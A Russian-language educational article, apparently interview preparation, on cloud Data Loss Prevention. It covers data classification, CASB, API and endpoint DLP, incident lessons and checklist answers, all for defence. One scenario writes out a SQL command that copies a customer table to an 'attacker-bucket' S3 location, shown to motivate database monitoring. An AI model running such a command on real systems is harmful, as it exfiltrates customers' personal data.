# Data Loss Prevention в облаке: Контроль, классификация и защита чувствительных данных в распределённых средах

## Что такое облачный DLP?

Представьте аэропорт с таможенным контролем. Через аэропорт проходят пассажиры с багажом — тысячи ежедневно. У таможни нет физической возможности вручную досмотреть каждую сумку. Вместо этого работают несколько слоёв: при регистрации багаж проходит через рентгеновский сканер, который автоматически распознаёт запрещённые предметы (огнестрельное оружие, жидкости больше 100 мл) — с точностью 99,9% без участия человека. Выборочно (по риск-профилю пассажира) сумка отправляется на ручной досмотр. На выходе: если пассажир пытается вывезти культурные ценности (предметы искусства), автоматический сканер может не отличить подделку от оригинала — здесь работает эксперт-искусствовед, проверяющий документы на каждую картину. Каждый слой решает свою задачу: скоростной автоматический для массового потока, экспертный ручной для уникальных случаев, и risk-based selective для промежуточных.

**Data Loss Prevention (DLP)** в облаке — это ровно такая многослойная система таможенного контроля для данных. Вместо багажа — файлы в S3/Blob/GCS, email-сообщения в SaaS, записи в базах данных. Вместо сканера — pattern-matching engine (regex для номеров кредитных карт, персональных данных), ML-классификаторы и context analysis. Вместо таможенника — DLP-политика, которая может заблокировать отправку, зашифровать, карантинировать или просто логировать факт обнаружения чувствительных данных. Фундаментальная проблема: в облаке данные распределены между десятками сервисов (хранилища, базы данных, SaaS-приложения, логи, API), и без единой системы контроля организация не знает, где находятся чувствительные данные, кто имеет к ним доступ и куда они утекают.

## Эволюция и мотивация

DLP как дисциплина родилась в эпоху on-premise периметров (2005-2010): агенты на рабочих станциях перехватывали попытки копирования на USB-drive, сетевое DLP-устройство сканировало исходящий email-трафик на границе дата-центра. Модель работала, пока все данные находились внутри периметра, а все каналы утечки проходили через контролируемые шлюзы.

Облако разрушило эту модель в трёх измерениях. Во-первых, данные покинули периметр: теперь они хранятся в S3/Blob/GCS, обрабатываются в Snowflake/Databricks, пересылаются через Slack/Teams. Во-вторых, исчезли choke points: в облаке данные могут утекать через сотни каналов — публичный S3-бакет, неправильно настроенный RDS snapshot sharing, экспорт из SaaS через API, копирование в личный Google Drive через корпоративный аккаунт. Сетевое DLP-устройство на границе офиса не видит ни одного из этих каналов. В-третьих, скорость распространения данных экспоненциально выросла: CI/CD-пайплайн может создать копию production-базы в Dev-аккаунте за 5 минут, разработчик может поделиться S3-ссылкой в Slack, и 50 человек получат доступ до того, как security-команда узнает.

Индустрия ответила архитектурным сдвигом от perimeter-based DLP (инспекция трафика на границе) к data-centric DLP (интеграция с облачными API для сканирования данных в месте их хранения и использования). Вместо попыток перехватить трафик — анализ через API: AWS S3 API (list objects, get object metadata), SaaS API (Google Workspace Drive API, Office 365 Graph API), Database API (RDS query, Snowflake access history). Cloud Access Security Broker (CASB) стал центральным элементом этой архитектуры — посредник между пользователем и облаком, контролирующий доступ и сканирующий данные в реальном времени.

Стандарты закрепили переход: GDPR Article 32 требует технических и организационных мер для защиты данных, включая DLP; PCI DSS Req 3.4 требует защиты PAN везде, где он хранится; NIST SP 800-53 AC-4 (Information Flow Enforcement) требует контроля информационных потоков, а SI-4 (System Monitoring) — мониторинга аномальной активности. CIS Controls v8, Control 3 (Data Protection), требует data classification и DLP как часть процесса.

## Зачем нужен облачный DLP?

**Сценарий 1: ПДн в логах приложения.** Разработчик пишет Lambda-функцию для обработки заказов. В debug-режиме функция пишет в CloudWatch Logs полный event payload: `{"customer": {"name": "Иван Петров", "email": "ivan@example.com", "phone": "+79161234567", "passport": "4512 123456"}}`. CloudWatch Logs доступны всем разработчикам с ролью Developer. Через месяц compliance-аудит (152-ФЗ) — данные обнаружены, организация не имела согласия на обработку логов с ПДн всех пользователей и не уведомила Роскомнадзор → штраф. С DLP: CloudWatch Logs Data Protection policy маскирует patterns: email, телефон, паспортные данные — в логах видно `***`, а не plaintext. Альтернативно — Lambda Extension перехватывает log stream, выполняет DLP-сканирование, блокирует запись строк с ПДн.

**Сценарий 2: Случайная отправка sensitive документа через Gmail.** Финансовый аналитик готовит квартальный отчёт для CEO, содержит неагрегированные зарплаты сотрудников и бонусы. Случайно отправляет его на `all@company.com` вместо `ceo@company.com` — 500 человек получают конфиденциальную информацию о компенсациях коллег. С DLP: Google Workspace DLP rule сканирует исходящие email на pattern keywords («зарплата», «бонус», «оклад») + attachment content inspection — обнаруживает таблицу с колонкой «Salary», блокирует отправку с уведомлением: «Этот документ содержит конфиденциальную информацию. Отправка разрешена только на CEO».

**Сценарий 3: Утечка через публичный S3-бакет.** Devops-инженер создаёт S3-бакет для хранения клиентских договоров (PDF-файлы с паспортными данными, адресами, ИНН). Забывает включить Block Public Access. Через Shodan исследователь находит бакет и уведомляет компанию. С DLP: (a) CSPM (Cloud Security Posture Management) обнаруживает public bucket — alert, (b) Amazon Macie — автоматически сканирует S3-бакеты, классифицирует файлы, обнаруживает паспортные данные (regex pattern), генерирует finding severity HIGH — до того, как Shodan проиндексирует. Автоматическая ремедиация: Lambda применяет `PutPublicAccessBlock`.

**Сценарий 4: Shadow IT — данные в личном Google Drive.** Менеджер по продажам использует личный Google Drive (не корпоративный Workspace) для хранения CRM-экспорта с контактами 2000 клиентов — «удобнее из дома». Утечка: Google-аккаунт скомпрометирован через credential stuffing, злоумышленник скачивает таблицу. С DLP: CASB (Netskope, Zscaler, Microsoft Defender for Cloud Apps) обнаруживает: (a) корпоративные данные загружены в не-корпоративное облачное хранилище (unsanctioned app), (b) DLP-политика срабатывает на keywords «customer list», «contact», (c) автоматическое действие: уведомление security-команде, блокировка дальнейших upload'ов с корпоративного устройства в unsanctioned apps. CIS v8 Control 3.8 (Data Protection on Endpoints) требует контроля каналов утечки.

**Сценарий 5: Data exfiltration через database COPY.** Злоумышленник с компрометированными credentials аналитика выполняет `COPY customer_data TO 's3://attacker-bucket/exfil.csv'` из Redshift/Snowflake. База данных не имеет egress контроля — `COPY` разрешён в любые внешние destinations. С DLP: (a) Database Activity Monitoring (DAM) — мониторинг SQL-команд, alert на `COPY TO s3://...` не из whitelisted destination, (b) Network egress фильтрация — разрешить доступ из подсети базы только к approved S3-бакетам (через VPC Endpoint policy), (c) IAM ограничение — Redshift IAM-роль имеет S3-доступ только к бакетам с тегом `environment=production`.

## Основные концепции

### Классификация данных: от известного к неизвестному

Классификация — фундамент DLP. Невозможно защитить данные, если не известно, что они чувствительные. В облаке классификация автоматизирована, потому что объём данных делает ручную классификацию нереализуемой.

**Регулярные выражения (Regex) и keyword matching:** первая линия — точные паттерны. Номер кредитной карты: `\b(?:\d[ -]*?){13,16}\b` + Luhn algorithm validation. Email: RFC 5322 pattern. Паспорт РФ: `\d{4} \d{6}`. ИНН: `\d{10}` или `\d{12}`. Keyword matching: «конфиденциально», «коммерческая тайна», «ДСП» в документе. Плюс: высокая speed (миллионы объектов в час), низкие false positives для хорошо определённых паттернов. Минус: не находит неструктурированные чувствительные данные (описание медицинского диагноза без слова «диагноз»).

**Машинное обучение (ML Classification):** Amazon Macie, Azure Purview, GCP Sensitive Data Protection используют обученные модели для классификации документов. ML находит: (a) медицинские записи (на основе статистического распределения medical terminology), (b) финансовые документы (структура таблиц, presence of monetary amounts), (c) исходный код (структура: keywords, syntax patterns), (d) персональные данные в неструктурированном тексте (story telling содержит имя, адрес, телефон без явных маркеров «телефон:»). Компромисс: ML медленнее regex (требует inference'а модели), дороже (compute cost per GB), и имеет false positive rate 2-5%, требующий human review для critical data. Но ML находит то, что regex никогда не найдёт.

**Fingerprinting (Exact Data Matching, EDM):** для защиты structured data (база данных клиентов, таблица зарплат). Создаётся «отпечаток» (hash) каждой строки из защищённой базы данных, и DLP-сканер сравнивает данные в файлах/email с этим отпечатком. Пример: DLP знает fingerprint таблицы `employees.salary`, и если email содержит строку, hash которой совпадает с записью из этой таблицы → block. Это защита от «structured data leak» — не regex pattern, а точное совпадение с защищёнными данными. Минус: требует хранения и обновления fingerprint database (синхронизация с источником правды).

**Уровни классификации как основа для политик:**
- Public — данные для публичного доступа: маркетинговые материалы, API-документация, open-source код. Ограничений нет.
- Internal — данные для внутреннего использования: организационная структура, внутренние wiki, meeting notes. Ограничения: запрет экспорта во внешние облачные сервисы (personal Google Drive, Dropbox).
- Confidential — коммерческая тайна, стратегические документы, M&A материалы, pre-release product info. Ограничения: шифрование mandatory, доступ по need-to-know, аудит каждого доступа, запрет отправки по email без шифрования.
- Restricted — персональные данные (ПДн), финансовая информация (PCI DSS), медицинские данные (PHI), государственная тайна. Ограничения: максимальные — field-level шифрование, доступ только через managed environments с DLP, автоматическая блокировка любой передачи вне managed channels.

NIST SP 800-53 RA-2 (Security Categorization) и ISO 27001 A.8.2 (Information Classification) требуют формализованной системы классификации.

### Каналы DLP в облаке: Inline, API-based, Endpoint

В отличие от on-premise DLP, облачный DLP работает через три канала, каждый со своей архитектурой:

**Inline / Real-Time (CASB proxy, SWG):** трафик проходит через DLP-прокси в реальном времени. CASB (Cloud Access Security Broker) — inline proxy или reverse proxy, перехватывает обращения к облачным сервисам и проверяет трафик до того, как он достигнет облака. Плюс: блокировка до того, как данные покинут контроль. Минус: latency overhead, TLS termination required (MITM), не покрывает server-to-server API-вызовы.

**API-based Scanning (Cloud DLP services):** DLP-сканер подключается к облачному сервису через его API (S3 ListObjects, Google Drive Files.list, Box API) и сканирует уже сохранённые данные. Плюс: не добавляет latency к user experience, покрывает данные at rest, не требует inline proxy. Минус: post-factum (сканирование после того, как данные уже сохранены), latency between upload и detection — от минут до часов в зависимости от scan frequency.

**Endpoint DLP (агент на устройстве):** агент на macOS/Windows контролирует: USB-порты, буфер обмена, печать, скриншоты, загрузки в браузере (cloud upload). Плюс: покрывает офлайн-сценарии (USB-drive), контролирует каналы, недоступные сетевому/облачному DLP. Минус: overhead на устройство, поддержка агентного парка, непокрытие BYOD и мобильных устройств без MDM. CIS v8 Control 3.10 (Data Protection) требует endpoint DLP для контролируемых устройств.

## Сравнение подходов к облачному DLP

| Критерий | CASB Inline Proxy (Netskope, Zscaler, Microsoft Defender) | API-based DLP (Amazon Macie, Azure Purview, GCP DLP) | Endpoint DLP Agent (Digital Guardian, Forcepoint, Symantec) |
|----------|-----------------------------------------------------------|------------------------------------------------------|------------------------------------------------------------|
| Время обнаружения | Real-time: блокировка до передачи в облако | Near real-time — часы: после сохранения данных в облаке | Real-time: блокировка до выхода с устройства |
| Coverage каналов утечки | Managed cloud apps (SaaS: Google Workspace, Office 365, Salesforce), Web traffic | Облачные хранилища (S3, Blob, GCS), базы данных (RDS, BigQuery), SaaS через API | Все каналы с endpoint: USB, Bluetooth, clipboard, print, upload через браузер |
| Overhead для пользователя | Latency 5-50ms для каждого облачного запроса, TLS-termination overhead | Нет пользовательского overhead (сканирование — background) | CPU/memory overhead агента (1-3% CPU, 100-200 MB RAM), возможны compatibility issues с другим ПО |
| Ложные срабатывания | Высокие без настройки (DLP rule must точно отражать бизнес-политику) | Средние: ML model false positive rate ~2-5% | Низкие: агент имеет полный контекст (user identity, application, process) |
| Возможность блокировки | Да: inline блокировка запроса к облачному API | Нет (только alert + remediation через автоматизацию) | Да: блокировка операции на endpoint (USB, upload) |
| Стандарты | NIST 800-53 AC-4 (Info Flow), CIS v8 Control 3.3 | NIST 800-53 RA-5 (Vulnerability Scanning), PCI DSS Req 3.4 | NIST 800-53 AC-19 (Access Control for Mobile), CIS v8 Control 3.10 |

Выбор стратегии: Inline CASB — mandatory для real-time защиты managed SaaS-приложений (email, file sharing). API-based — mandatory для cloud-native data stores (S3, Blob, BigQuery) где inline proxy не может перехватить server-side API-вызовы. Endpoint — для regulated устройств и защиты от offline утечек.

Оптимальная архитектура — комбинация: CASB для SaaS + API-based для облачных хранилищ + Endpoint для managed devices с доступом к sensitive данным. Это multi-layered DLP, покрывающее все каналы эксфильтрации.

## Уроки из реальных инцидентов

### Инцидент Pegasus Airlines (2022): Открытый S3-бакет с ПДн пассажиров

Хронология: в июне 2022 года исследователь безопасности обнаружил открытый AWS S3-бакет, принадлежащий турецкой авиакомпании Pegasus Airlines. Бакет содержал ~23 миллиона файлов (6.5 TB), включая: персональные данные пассажиров (имена, email, телефоны, паспортные данные), внутренние документы компании, исходный код бортового ПО, flight data (телеметрия самолётов), и подписанные конфиденциальные контракты. Бакет был не просто публичным — он имел полный list и read доступ для любого пользователя интернета. Обнаружен через Shodan и общедоступные инструменты поиска открытых S3-бакетов.

DLP-анализ: организация имела: (a) отсутствие классификации данных — ПДн, исходный код и телеметрия лежали в одном бакете без разграничения, (b) отсутствие DLP-сканирования — Macie (или аналог) не был настроен, иначе данные были бы классифицированы до утечки, (c) отсутствие CSPM-мониторинга — public access detection сработал бы через 15 минут, (d) отсутствие политики «никогда не публичный» для S3.

Как архитектура DLP изменила бы исход: (a) SCP на уровне AWS Organization — Deny `s3:PutBucketPublicAccessBlock` с `BlockPublicAcls: false` и `BlockPublicPolicy: false` для production-аккаунтов, (b) Amazon Macie — автоматически классифицирует бакет, обнаруживает паспортные patterns, генерирует finding CRITICAL в день создания бакета — задолго до Shodan, (c) автоматическая ремедиация — Lambda function реагирует на Macie finding, применяет Block Public Access и уведомляет security team.

Урок: отсутствие DLP — не просто «риск», а гарантированный инцидент в масштабе организации с сотнями S3-бакетов. Без автоматической классификации и непрерывного мониторинга открытый sensitive-бакет — вопрос времени, а не вероятности.

### Инцидент Microsoft (2020): Утечка customer support data через misconfigured database

Хронология: в январе 2020 года Microsoft раскрыла, что внутренняя база данных customer support была сконфигурирована с неправильными сетевыми правилами безопасности в течение декабря 2019 года. База данных была доступна из интернета без аутентификации. Масштаб: ~250 миллионов записей customer support за 14 лет — включая email, IP-адреса, описания обращений (которые могли содержать ПДн).

DLP-аспект: утечка не через внешнего злоумышленника, а через misconfiguration на уровне облачной базы данных (Azure Cosmos DB / SQL Database). Данные хранились в plaintext (без шифрования или клиентского шифрования), и firewall rules были accidentally opened.

Как DLP изменил бы исход: (a) Database-level DLP — Azure SQL Database Data Discovery & Classification автоматически сканирует колонки базы данных, обнаруживает колонки с ПДн (email, IP), помечает их как «Confidential», (b) Azure SQL Database Advanced Data Security — continuous monitoring конфигурации firewall rules, alert если public endpoint enabled без documented exception, (c) network DLP — если база данных имеет public endpoint, DLP-политика может автоматически блокировать исходящие запросы на external IPs с чувствительными данными.

Урок: DLP — не только про файлы и email. Структурированные данные в базах данных — более ценный target для злоумышленников, и DLP должен покрывать их через database-level сканирование и конфигурационный мониторинг.

## Инструменты и средства облачного DLP

| Класс инструмента | Назначение | Позиция в жизненном цикле | Связь со стандартами |
|-------------------|------------|---------------------------|----------------------|
| Cloud-native DLP & Classification (Amazon Macie, Azure Purview, GCP Sensitive Data Protection) | Автоматическое обнаружение и классификация чувствительных данных в облачных хранилищах через ML и pattern-matching, генерация findings для SIEM/SOAR | Continuous scan хранилищ + on-demand для compliance audits | NIST 800-53 RA-5, PCI DSS Req 3, HIPAA Security Rule §164.312 |
| CASB (Cloud Access Security Broker) DLP (Netskope, Zscaler, Microsoft Defender for Cloud Apps) | Real-time инспекция трафика к облачным сервисам: контроль доступа, DLP-проверка загружаемого/скачиваемого контента, shadow IT discovery | Runtime: inline proxy или API-based для SaaS | CIS v8 Control 3.3, 12.3, NIST 800-53 AC-4 |
| Database Activity Monitoring (DAM) & DLP (Imperva, IBM Guardium, AWS RDS Database Activity Streams) | Мониторинг SQL-запросов к БД: обнаружение аномальных bulk downloads, COPY TO external, необычных SELECT * WHERE чувствительные колонки | Runtime: интеграция с ядром БД или аудит-логами | NIST 800-53 SI-4, PCI DSS Req 10.2 |
| Endpoint DLP (Forcepoint, Digital Guardian, Symantec) | Контроль передачи данных через endpoint-каналы: USB, Bluetooth, clipboard, print, email client, instant messaging | Runtime: kernel-level driver + user-mode agent | CIS v8 Control 3.10, NIST 800-53 AC-19 |
| Enterprise Data Catalog / Data Governance (Collibra, Alation, Atlan, AWS Glue Data Catalog) | Metadata management: каталог всех data sets в организации с тегами классификации, lineage, ownership, и compliance policies | Foundation: создание единого knowledge graph данных | ISO 27001 A.8.2 (Classification), GDPR Art. 30 (Records of Processing) |

DAM (Database Activity Monitoring) — критичный, но часто упускаемый компонент DLP. DAM анализирует SQL-запросы в реальном времени и ищет: (a) SELECT с чрезмерным количеством строк (data dump — более 10000 строк за раз), (b) COPY/EXPORT в external location (S3, GCS), (c) запросы, выполняемые не-приложением (приложение-сервис vs human user — разное behavior), (d) доступ к чувствительным колонкам (credit_card_number, ssn) в non-business hours.

Enterprise Data Catalog — emerging инструмент для решения проблемы «где мои данные?». DLP работает лучше всего, когда знает, какие данные существуют и где они. Catalog индексирует все S3/Blob/GCS бакеты, все таблицы БД, все SaaS-приложения, и строит единый searchable inventory с тегами классификации. Это превращает вопрос «найдите все данные с ПДн» из недельного исследования в 5-секундный search query. CIS v8 Control 1.4 (Data Inventory) требует catalog всех data assets.

## Архитектурные решения

Построение зрелого облачного DLP — это integration на трёх уровнях: data discovery (где данные), classification (какие чувствительные) и policy enforcement (как защищены).

**Архитектурные принципы:**
- Data-Centric, не Channel-Centric: DLP должен быть привязан к данным, а не к каналу передачи. S3-бакет с ПДн имеет classification tag `pii:true` от Macie, и этот tag enforcement'ится на всех каналах: если кто-то пытается скачать файл из этого бакета через Lambda (S3 GetObject API), Lambda IAM-политика + DLP rule блокируют по тегу.
- Auto-Classification with Human Review: ML-классификатор предлагает метки; человек (data steward) подтверждает/отклоняет. Это minimises false positives и повышает качество DLP-правил.
- Policy-as-Code для DLP: DLP-правила определяются как код (JSON/YAML), версионируются в Git, проходят CI/CD-валидацию, применяются через Terraform/CloudFormation. Это обеспечивает consistency между средами и аудит изменений.
- Encryption as DLP complement: если данные зашифрованы на уровне клиента (client-side encryption), DLP имеет ограниченные возможности контент-инспекции. Решение: инспекция до шифрования (на endpoint или CASB) + метаданные классификации, которые не шифруются и позволяют enforcement даже encrypted данных через теги.

**Метрики эффективности:**
- Data Classification Coverage: доля облачных ресурсов, прошедших DLP-классификацию (цель: 100% для production storage)
- Sensitive Data Detection Time (MTTD for exposed PII): среднее время от загрузки ПДн в облачное хранилище до обнаружения (цель: менее 1 часа)
- DLP Incident Response Time: время от DLP alert до блокировки/карантина (цель: менее 5 минут для CRITICAL, автоматическая реакция)
- False Positive Rate: доля DLP alerts, классифицированных как ложные (цель: менее 5%)
- DLP Rule Coverage by Channel: процент каналов эксфильтрации с active DLP rule (цель: 100% для managed channels, документированные gaps для unmanaged)

**Красные флаги деградации:** Macie/Purview/Sensitive Data Protection не настроен для production-аккаунтов; S3-бакет создан без encryption и без DLP scan policy; CASB DLP policy в режиме monitor-only более 90 дней (должен быть переведён в block mode после tuning); DLP alert backlog растёт (incidents не обрабатываются); классификация устарела (Macie finding generated > 180 дней назад, не обновлён).

**Сценарий миграции on-premise DLP в облако:** этап 1 — включение cloud-native DLP (Macie/Purview/SDP) для production-хранилищ, initial scan: обнаружение всех существующих ПДн (retrospective finding). Этап 2 — remediation priority: все CRITICAL findings (publicly exposed PII) → немедленно закрыть. Этап 3 — настройка CASB DLP для managed SaaS (Google Workspace, Office 365, Slack), monitor-only режим на 2 недели для tuning false positives. Этап 4 — enforcement mode с автоматической блокировкой для deterministic violations (PCI, PII patterns). Этап 5 — endpoint DLP rollout на managed devices для закрытия offline-каналов утечки.

## Подготовка к собеседованию: Common pitfalls & key questions

**Типичная ошибка 1: «DLP — это просто regex patterns на чувствительные данные».**
Regex — один из methods обнаружения, но недостаточный. DLP включает: data classification workflow (как организация определяет, что считать чувствительным), контекстный анализ (медицинский документ, содержащий термин «рак», но не содержащий персональных данных — нужен контекст), enforcement actions (блокировка, шифрование, quarantine), и integration с incident response (DLP finding → SIEM → SOAR playbook).

**Типичная ошибка 2: «DLP на S3 через Macie — coverage 100%».**
Macie сканирует только S3-бакеты в том же аккаунте, где включён. Lambda-функции, которые пишут ПДн в `/tmp` or process data in-memory, не сканируются. CloudWatch Logs, которые содержат ПДн, — не сканируются Macie (для них нужен CloudWatch Logs Data Protection). Snowflake, который содержит ПДн, — не сканируется Macie (нужен Snowflake DLP). Coverage 100% требует DLP на каждом типе хранилища.

**Типичная ошибка 3: «Если DLP блокирует email с ПДн — сотрудник найдёт обходной путь».**
Это реалистичная проблема. Если DLP слишком restrictive, пользователи находят обходные пути (личный Gmail, мессенджеры, screenshot + OCR). Поэтому DLP-архитектура должна включать: user education (почему блокировка), acceptable alternative channels (защищённый файлообменник вместо email), и monitoring of shadow IT channels (CASB обнаруживает использование unsanctioned apps).

**Сложный вопрос 1: «Как защитить данные, которые используются в data pipeline: S3 → AWS Glue ETL → Redshift → QuickSight? DLP должен работать на каждом этапе, но каждый использует разные технологии.»**
Проверяется: архитектурное понимание end-to-end DLP. Ответ: (a) S3 — Macie scan исходных данных, классификация, tagging, (b) Glue ETL — проверка, что ETL job не выводит чувствительные колонки в intermediate storage без необходимости (data minimization), Glue job IAM-роль — минимальные права (не S3:*), (c) Redshift — Column-level Access Control (GRANT SELECT на чувствительные колонки только authorised users), DAM мониторинг запросов, (d) QuickSight — Row-Level Security (каждый пользователь видит только свои данные), DLP на экспорт (запрет CSV export для non-admin users). DLP policy — сквозная: классификация передаётся через metadata tagging (AWS Glue Data Catalog хранит колонки-теги `pii: true`, Redshift наследует через Glue-Lake Formation integration). NIST 800-53 AC-4 (Info Flow Enforcement) требует мониторинга и контроля на каждой границе между системами.

**Сложный вопрос 2: «Как обеспечить GDPR compliance в мультиклауд (AWS + Azure) через единые DLP-политики, учитывая что каждый провайдер имеет собственный DLP инструмент?»**
Проверяется: способность объединять разрозненные инструменты в единый compliance framework. Ответ: (a) Single classification taxonomy, применяемая в обоих облаках: Public, Internal, Confidential, Restricted — через consistent metadata tags (AWS tags, Azure resource tags), (b) DLP-сканеры, разные (Macie в AWS, Purview в Azure), оба конфигурируются с одинаковыми sensitivity types (PII: email, phone, passport — один regex pattern set), (c) findings агрегируются в единый SIEM (Splunk/Sentinel), где коррелируются и приоритизируются по единой severity scale, (d) SOAR playbook автоматизирует remediation: Macie finding → Step Function → проверка, если ресурс в AWS, Lambda remediation; если в Azure — Azure Automation Runbook. Единая политика — через Policy-as-Code (OPA/Rego), валидирующая DLP-config как для AWS CloudFormation, так и для Azure ARM/Bicep.

**Сложный вопрос 3: «Как вы реализуете DLP для AI/ML пайплайна, где разработчики используют production-данные для training моделей? Данные копируются из production S3 в ML-среду, и нужно предотвратить их утечку через model artefacts, Jupyter notebooks, или exported models.»**
Проверяется: DLP в emerging AI/ML контексте. Ответ: (a) Data Access Governance: ML-роль имеет доступ только к anonymized/pseudonymized данным (через Glue transform или Redshift view с mask'ированными ПДн-колонками) для training; если нужны реальные данные (для тестирования accuracy) — отдельная approval workflow с временным доступом (JIT) и аудитом каждого доступа, (b) DLP на Jupyter notebook: SageMaker notebook — ограничения на download/upload (SageMaker Studio network isolation, no internet access), мониторинг всех cell executions через CloudTrail (Data Events), DLP проверка exported notebook'ов (`.ipynb` файлов, которые могут содержать hardcoded ПДн), (c) Model Artefacts: обученная модель может «запомнить» training данные (model inversion attack) — Differential Privacy techniques при training снижают этот риск, (d) Inference API DLP: модель, развёрнутая как SageMaker Endpoint, — входные запросы проверяются на injection, выходные ответы — на ПДн-patterns (если модель не должна возвращать ПДн). CIS v8 не имеет specific AI/ML controls (на 2024), NIST AI RMF (AI Risk Management Framework, 2023) — emerging framework для AI-specfic security.

## Чек-лист понимания

- [ ] Почему perimeter-based DLP (сетевой шлюз на границе офиса) не защищает облачные данные, и какой архитектурный сдвиг требуется?
- [ ] В каком случае ML-классификатор даёт false negative для чувствительных данных, которые regex бы обнаружил?
- [ ] Как обеспечить DLP для данных, которые обрабатываются в памяти Lambda-функции и никогда не записываются в постоянное хранилище?
- [ ] Почему CASB inline proxy без TLS decryption — partial DLP решение, и какой трафик не инспектируется?
- [ ] В каком случае endpoint DLP не может предотвратить утечку через браузер, хотя USB-порт заблокирован?
- [ ] Как data fingerprinting (EDM) обнаруживает утечку structured данных, и какой operational overhead это создаёт?
- [ ] Почему DLP-политика в monitor-only режиме более 90 дней — security risk, а не cautious approach?
- [ ] В каком случае шифрование at rest конфликтует с DLP-сканированием контента, и какой architectural pattern решает эту коллизию?
- [ ] Как database DLP (DAM) детектирует data exfiltration через SQL-запросы, которые выглядят легитимно (легитимный пользователь, правильный SQL синтаксис)?
- [ ] Почему DLP без интеграции с SOAR и автоматической ремедиацией — observability tool, а не protection mechanism?

### Ответы на чек-лист

1. **Ответ:** Perimeter-based DLP инспектирует трафик, проходящий через контролируемый шлюз (корпоративный файрвол, proxy). В облаке данные: (a) выгружаются напрямую через S3 API/CLI (трафик может идти мимо корпоративной сети — developer из дома, CI/CD из облака), (b) передаются server-to-server через облачные API (Lambda → S3 — внутри сети провайдера, не через корпоративный шлюз), (c) копируются между регионами и облаками через managed сервисы (S3 Cross-Region Replication, Azure Data Share) — трафик невидим. Сдвиг: от inline interception к data-centric scanning: DLP интегрируется с облачными API для сканирования данных at rest и мониторинга доступа. CIS v8 Control 3.3 требует data protection в любом месте хранения.

2. **Ответ:** ML-классификатор обучен на общем корпусе документов и может не распознать: (a) редкие форматы данных (устаревший формат документации, custom template), (b) данные на uncommon языке (ML model trained on English/Russian, не знает турецкий — пропускает ПДн в турецких документах), (c) обфусцированные данные (частично скрытые номера карт: `4512-XXXX-XXXX-1234` — ML видит «маскированный», regex pattern для частичного PAN всё равно обнаружит). Regex точнее для детерминированных паттернов, но слеп для неструктурированных данных. Комбинированный подход обязателен.

3. **Ответ:** Lambda execution — transient. DLP на уровне функции требует: (a) Lambda Extension, который перехватывает все outbound API-вызовы (HTTP SDK/клиент) и сканирует данные до отправки — inline DLP на уровне рантайма функции (сложно, мало инструментов), (b) Lambda Environment Variables — проверка на embedded secrets/credentials (CI/CD DLP scan до деплоя), (c) CloudWatch Logs — Data Protection policy маскирует ПДн в логах, (d) если функция взаимодействует с другими сервисами (пишет в S3, DynamoDB) — DLP на этих сервисах (Macie scan после записи) — post-factum, но обнаружит ПДн. NIST SP 800-53 SA-11 требует security testing, включая runtime-мониторинг для serverless.

4. **Ответ:** Без TLS decryption CASB видит только TLS handshake metadata: SNI (доменное имя сервера), certificate issuer, connection timestamp. Не видит: HTTP method, URL path, request/response body, cookies, authorization headers. Для DLP нужно видеть body (где данные). TLS-decryption прокси добавляет latency и создаёт trust concern (MITM всех соединений). Альтернатива: endpoint-based inspection (агент на устройстве проверяет данные до шифрования) или API-based DLP (сканирование уже сохранённых данных).

5. **Ответ:** Endpoint DLP блокирует файловые операции (USB write, file copy). Но утечка через браузер — это application-layer: пользователь открывает личный Google Drive, drag-and-drop'ит файл в окно браузера — для ОС это не «file write to USB», а «clipboard paste into browser window». Endpoint DLP должен: (a) инспектировать upload через браузер (DLP агент с browser extension или kernel-level network inspection), (b) использовать CASB integration — агент сообщает CASB о контексте пользователя, CASB блокирует upload на облачной стороне. Без CASB — endpoint DLP слеп к облачным uploads.

6. **Ответ:** EDM создаёт hash (HMAC) для каждой строки protected database и ищет этот hash в проверяемом документе/файле/email. Если строка `Иван Петров, ivan@example.com, +79161234567` из customer DB — EDM вычисляет её hash и ищет этот hash в файле. Operational overhead: (a) hash database должна обновляться синхронно с защищённой БД (daily sync → ETL job), (b) разные представления данных: в БД телефон хранится как `+7 (916) 123-45-67`, в email — `89161234567` — EDM не найдёт match без нормализации, (c) hash database для миллионов записей — значительные требования к storage. EDM — powerful для structured data leak, но сложен в поддержке.

7. **Ответ:** Monitor-only — DLP логирует violations, но не блокирует. После 90 дней: (a) tuning должен быть завершён (false positives идентифицированы, правила откорректированы), (b) если blocking не включается — это означает одно из двух: либо правила никогда не станут достаточно точны (нужно redesign), либо команда боится бизнес-impact и откладывает — в обоих случаях DLP не предотвращает утечки, он только документирует их post-factum. CIS v8 Control 3.3 требует active enforcement, не только monitoring.

8. **Ответ:** DLP-сканер не может инспектировать зашифрованные данные (ciphertext), потому что он не имеет ключа дешифровки (иначе DLP сканер = privileged single point of failure). Resolution: (a) scan content before encryption (в момент создания файла, через endpoint CASB или client-side encryption library + DLP hook), (b) metadata-based DLP: классификационный тег (Macie tag), который не шифруется (прикреплён к объекту как metadata) и позволяет DLP-правилам проверять «этот объект содержит ПДн?» по тегу, а не по контенту, (c) для server-side encryption with KMS: разрешить DLP-сервису доступ к KMS decrypt через отдельную, audit'ируемую IAM-роль (managed DLP service decrypts, scans, alerts). Это добавляет trust assumption (DLP service has plaintext access). NIST SP 800-53 SC-28 требует баланса шифрования и мониторинга.

9. **Ответ:** Legitimate-looking SQL запросы (valid syntax, authorised user, correct table) — самый сложный detection case. Детекция через: (a) behavioural baseline: user analyst typically queries 100 rows per day — today 1,000,000 rows (bulk download anomaly), (b) outbound destination: COPY TO s3://destination — if destination is external non-whitelisted bucket, (c) time anomaly: user queries sensitive table at 02:00 AM (never did before), (d) query complexity: SELECT * vs SELECT specific columns — SELECT * from sensitive table for user who normally queries aggregated views, (e) result exfiltration через successive queries: user делает 1000 запросов по 1000 строк каждый — суммарно 1M строк за час (slow data drain). DAM + UEBA строит baseline per user/role и алертит на отклонения.

10. **Ответ:** DLP finding без автоматической реакции = «мы знаем, что данные утекли, но не остановили». Time gap между finding и human response — это окно, в течение которого злоумышленник может завершить эксфильтрацию. Автоматическая ремедиация (apply Block Public Access для S3, revoke sharing link, quarantine file) — закрывает уязвимость за секунды. SOAR playbook автоматизирует multi-step response: finding → enrichment (who, what, when context) → immediate containment → notification → ticket → escalation. Без SOAR — ручной response занимает часы, что критично для data exfiltration. NIST SP 800-53 IR-4 (Incident Response) требует автоматизации для timely response.

## Ключевые выводы для собеседования

- **Самый критичный принцип:** DLP в облаке — data-centric, а не channel-centric. Нельзя полагаться на инспекцию каналов передачи (email gateway, web proxy) — нужно сканировать данные в месте их хранения и использования через облачные API.
